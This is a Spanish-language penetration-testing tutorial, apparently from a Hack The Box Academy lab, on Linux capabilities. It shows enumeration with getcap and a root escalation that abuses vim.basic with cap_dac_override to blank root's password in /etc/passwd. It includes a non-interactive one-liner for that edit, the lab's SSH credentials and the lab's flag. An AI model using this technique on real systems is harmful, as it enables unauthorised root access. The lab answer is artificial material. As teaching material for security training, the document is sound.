
# Capabilities

Las capacidades o `capabilities` de Linux son una característica de seguridad del sistema operativo Linux que permite otorgar privilegios específicos a los procesos, lo que les permite realizar acciones específicas que de otro modo estarían restringidas. Esto permite un control más preciso sobre qué procesos tienen acceso a ciertos privilegios, lo que lo hace más seguro que el modelo tradicional de Unix de otorgar privilegios a usuarios y grupos.

Sin embargo, como cualquier característica de seguridad, las capacidades de Linux no son invulnerables y pueden ser explotadas por atacantes. Una vulnerabilidad común es el uso de capacidades para otorgar privilegios a procesos que no están adecuadamente aislados o aislados de otros procesos, lo que nos permite aumentar sus privilegios y obtener acceso a información confidencial o realizar acciones no autorizadas.

Otra vulnerabilidad potencial es el mal uso o uso excesivo de las capacidades, lo que puede provocar que los procesos tengan más privilegios de los que necesitan. Esto puede generar riesgos de seguridad innecesarios, ya que podríamos explotar estos privilegios para obtener acceso a información sensible o realizar acciones no autorizadas.

En general, las capacidades de Linux pueden ser una característica de seguridad práctica, pero deben usarse con cuidado y correctamente para evitar vulnerabilidades y posibles ataques.

La configuración de capacidades implica el uso de las herramientas y los comandos adecuados para asignar capacidades específicas a ejecutables o programas. En Ubuntu, por ejemplo, podemos utilizar el comando `setcap` para configurar capacidades para ejecutables específicos. Este comando nos permite especificar la capacidad que queremos configurar y el valor que queremos asignar.

Por ejemplo, podríamos usar el siguiente comando para establecer la capacidad `cap_net_bind_service` de un ejecutable:

## <mark style="color:purple;">**Establecer capacidades**</mark>

```shell-session
afsh4ck@kali$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Cuando se establecen capacidades para un binario, significa que el binario podrá realizar acciones específicas que no podría realizar sin las capacidades. Por ejemplo, si se establece la capacidad `cap_net_bind_service` para un binario, este podrá vincularse a puertos de red, lo cual es un privilegio que normalmente está restringido.

Algunas capacidades, como `cap_sys_admin`, que permite a un ejecutable realizar acciones con privilegios administrativos, pueden ser peligrosas si no se utilizan adecuadamente. Por ejemplo, podríamos explotarlas para escalar sus privilegios, obtener acceso a información confidencial o realizar acciones no autorizadas. Por lo tanto, es fundamental configurar este tipo de capacidades para ejecutables aislados y en un entorno de pruebas adecuado y evitar otorgarlas innecesariamente.

<table data-header-hidden><thead><tr><th width="254"></th><th></th></tr></thead><tbody><tr><td><strong>Capacidad</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>cap_sys_admin</code></td><td>Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar configuraciones del sistema.</td></tr><tr><td><code>cap_sys_chroot</code></td><td>Permite cambiar el directorio raíz del proceso actual, permitiéndole acceder a archivos y directorios que de otra manera serían inaccesibles.</td></tr><tr><td><code>cap_sys_ptrace</code></td><td>Permite conectarse a otros procesos y depurarlos, lo que potencialmente le permite obtener acceso a información confidencial o modificar el comportamiento de otros procesos.</td></tr><tr><td><code>cap_sys_nice</code></td><td>Permite aumentar o disminuir la prioridad de los procesos, lo que potencialmente le permitirá obtener acceso a recursos que de otro modo estarían restringidos.</td></tr><tr><td><code>cap_sys_time</code></td><td>Permite modificar el reloj del sistema, lo que potencialmente le permite manipular marcas de tiempo o hacer que otros procesos se comporten de manera inesperada.</td></tr><tr><td><code>cap_sys_resource</code></td><td>Permite modificar los límites de recursos del sistema, como el número máximo de descriptores de archivos abiertos o la cantidad máxima de memoria que se puede asignar.</td></tr><tr><td><code>cap_sys_module</code></td><td>Permite cargar y descargar módulos del kernel, lo que potencialmente le permite modificar el comportamiento del sistema operativo u obtener acceso a información confidencial.</td></tr><tr><td><code>cap_net_bind_service</code></td><td>Permite vincularse a puertos de red, lo que potencialmente le permite obtener acceso a información confidencial o realizar acciones no autorizadas.</td></tr></tbody></table>

Cuando se ejecuta un binario con capacidades, puede realizar las acciones que permiten las capacidades. Sin embargo, no podrá realizar ninguna acción que no esté permitida por las capacidades. Esto permite un control más detallado de los privilegios del binario y puede ayudar a prevenir vulnerabilidades de seguridad y acceso no autorizado a información confidencial.

Al utilizar el `setcap`comando para configurar las capacidades de un ejecutable en Linux, debemos especificar la capacidad que queremos configurar y el valor que queremos asignar. Los valores que utilicemos dependerán de la capacidad específica que estemos configurando y de los privilegios que queramos otorgar al ejecutable.

A continuación se muestran algunos ejemplos de valores que podemos usar con el comando `setcap`, junto con una breve descripción de lo que hacen:

<table data-header-hidden><thead><tr><th width="130"></th><th></th></tr></thead><tbody><tr><td><strong>Valores de capacidad</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>=</code></td><td>Este valor establece la capacidad especificada para el ejecutable, pero no otorga ningún privilegio. Esto puede resultar útil si queremos borrar una capacidad previamente establecida para el ejecutable.</td></tr><tr><td><code>+ep</code></td><td>Este valor otorga al ejecutable los privilegios efectivos y permitidos para la capacidad especificada. Esto permite que el ejecutable realice las acciones que permite la capacidad, pero no le permite realizar ninguna acción que no esté permitida por la capacidad.</td></tr><tr><td><code>+ei</code></td><td>Este valor otorga privilegios suficientes y heredables para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que permite la capacidad y que los procesos secundarios generados por el ejecutable hereden la capacidad y realicen las mismas acciones.</td></tr><tr><td><code>+p</code></td><td>Este valor otorga los privilegios permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que permite la capacidad, pero no le permite realizar ninguna acción que no esté permitida por la capacidad. Esto puede ser útil si queremos otorgar la capacidad al ejecutable, pero evitar que la herede o permitir que los procesos secundarios la hereden.</td></tr></tbody></table>

Se pueden utilizar varias capacidades de Linux para aumentar los privilegios de un usuario a `root`, entre ellas:

<table data-header-hidden><thead><tr><th width="212"></th><th></th></tr></thead><tbody><tr><td><strong>Capacidad</strong></td><td><strong>Descripcion</strong></td></tr><tr><td><code>cap_setuid</code></td><td>Permite que un proceso establezca su ID de usuario efectivo, que puede usarse para obtener los privilegios de otro usuario, incluido el <code>root</code>propio.</td></tr><tr><td><code>cap_setgid</code></td><td>Permite establecer su ID de grupo efectivo, que puede usarse para obtener los privilegios de otro grupo, incluido el grupo <code>root</code>.</td></tr><tr><td><code>cap_sys_admin</code></td><td>Esta capacidad proporciona una amplia gama de privilegios administrativos, incluida la capacidad de realizar muchas acciones reservadas para el usuario <code>root</code>, como modificar la configuración del sistema y montar y desmontar sistemas de archivos.</td></tr><tr><td><code>cap_dac_override</code></td><td>Permite omitir las comprobaciones de permisos de lectura, escritura y ejecución de archivos.</td></tr></tbody></table>

***

## <mark style="color:purple;">Enumeración de capacidades</mark>

Es importante tener en cuenta que estas capacidades deben utilizarse con precaución y solo deben concederse a procesos de confianza, ya que pueden utilizarse de forma indebida para obtener acceso no autorizado al sistema. Para enumerar todas las capacidades existentes para todos los ejecutables binarios existentes en un sistema Linux, podemos utilizar el siguiente comando:

```shell-session
afsh4ck@kali$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Este comando de una sola línea utiliza el comando `find` para buscar todos los ejecutables binarios en los directorios donde se encuentran normalmente y luego utiliza el indicador `-exec` para ejecutar el comando `getcap` en cada uno, mostrando las capacidades que se han establecido para ese binario. La salida de este comando mostrará una lista de todos los ejecutables binarios en el sistema, junto con las capacidades que se han establecido para cada uno.

***

## <mark style="color:purple;">Explotación</mark>

Si obtuvimos acceso al sistema con una cuenta con privilegios bajos, entonces descubrimos la capacidad `cap_dac_override`:

**Explotación de capacidades**

```shell-session
afsh4ck@kali$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Por ejemplo, el binario `/usr/bin/vim.basic` se ejecuta sin privilegios especiales, como con `sudo`. Sin embargo, debido a que el binario tiene la capacidad `cap_dac_override` establecida, puede aumentar los privilegios del usuario que lo ejecuta. Esto permitiría al evaluador de penetración obtener la capacidad `cap_dac_override` y realizar tareas que requieren esta capacidad.

Echemos un vistazo al archivo `/etc/passwd` donde se especifica el usuario :`root`

```shell-session
afsh4ck@kali$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Podemos utilizar la capacidad `cap_dac_override` del binario `/usr/bin/vim` para modificar un archivo del sistema:

```shell-session
afsh4ck@kali$ /usr/bin/vim.basic /etc/passwd
```

También podemos realizar estos cambios en un modo no interactivo:

```shell-session
afsh4ck@kali$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
afsh4ck@kali$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Ahora, podemos ver que en esa línea ha desaparecido  la `x`, lo que significa que podemos usar el comando `su` para iniciar sesión como root sin que se nos solicite la contraseña.

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.205.111 (ACADEMY-LLPE-CAP)
Usuario "htb-student"
Contraseña "HTB_@cademy_stdnt!"
```

Aumente los privilegios utilizando capacidades y lea el archivo `flag.txt` en el directorio "`/root`". Envíe su contenido como respuesta.

```shell-session
htb-student@ubuntu:~$ id
uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student)

htb-student@ubuntu:~$ sudo -l
[sudo] password for htb-student: 
Sorry, user htb-student may not run sudo on ubuntu.
```

Al acceder vamos que no pertenecemos a ningún grupo especial ni podemos ejecutar sudo. Hacemos un getcap de `/usr/bin/vim.basic` y confirmamos que tenemos bajos privilegios, ya que descubrimos la capacidad `cap_dac_override`

```shell-session
htb-student@ubuntu:~$ getcap /usr/bin/vim.basic
/usr/bin/vim.basic = cap_dac_override+eip
```

Podemos utilizar la capacidad `cap_dac_override` del binario `/usr/bin/vim` para modificar un archivo del sistema como `/etc/passwd`:

```shell-session
htb-student@ubuntu:~$ cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
```

<pre class="language-bash"><code class="lang-bash">afsh4ck@kali$ vim /etc/passwd
<strong># Editar esta línea
</strong>root:x:0:0:root:/root:/bin/bash
# Por esta: quitar la x
root::0:0:root:/root:/bin/bash
</code></pre>

```shell-session
htb-student@ubuntu:~$ cat /etc/passwd | grep root
root::0:0:root:/root:/bin/bash
```

Una vez que lo hemos modificado podemos cambiar al usuario root sin poner ninguna contraseña, y acceder a la flag dentro del directorio `/root`:

```shell-session
htb-student@ubuntu:~$ su root
root@ubuntu:/home/htb-student# whoami
root
root@ubuntu:/home/htb-student# cd /root
root@ubuntu:~# ls
flag.txt  snap
root@ubuntu:~# cat flag.txt 
HTB{c4paB1li7i3s_pR1v35c}
```
